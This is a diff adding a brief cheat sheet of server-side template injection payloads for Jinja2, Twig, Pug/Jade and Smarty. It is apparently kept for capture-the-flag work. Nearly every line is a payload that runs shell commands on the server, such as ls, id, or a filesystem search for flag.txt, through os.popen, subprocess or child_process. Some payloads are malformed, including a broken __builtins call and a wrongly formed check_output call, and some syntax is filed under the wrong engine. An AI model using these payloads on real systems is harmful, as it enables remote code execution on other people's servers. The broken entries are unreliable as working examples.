@@ -1,0 +1,23 @@
+##### SSTI
+Server side templet injection
+jnija2	:
+	{{ 7*7 }}
+	<% import os; x = os.popen('find / -type f -name flag.txt').read() %> ${x}
+	{{ self.__init__.__globals__.__builtins import('os').popen('ls').read() }}
+	{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls"], ["-la"])}}
+	{{"".__class__.__mro__[1].__subclasses__()}}
+
+Jinja2-python/Twig-php: {{ 7*7 }}
+
+
+NodeJs - Jade/Pug: #{{ 7*7 }}
+ Pug/Jade directly allows JavaScript execution within its templates without the need for additional delimiters like {{ }}
+ #{root.process.mainModule.require('child_process').spawnSync('id').stdout}
+ #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}	
+ !{}
+ 
+ 
+Smarty PHP:
+ tag: {'Hello'|upper}
+ {system("ls")}
+
